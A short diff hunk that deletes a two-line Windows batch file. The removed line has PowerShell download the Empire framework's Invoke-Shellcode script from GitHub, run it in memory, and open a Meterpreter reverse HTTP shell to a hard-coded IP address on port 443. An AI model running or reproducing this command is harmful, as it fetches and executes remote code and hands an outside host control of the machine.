@@ -1,2 +1,0 @@
-@echo off
-powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 13.126.11.49 -Lport 443 -Force"
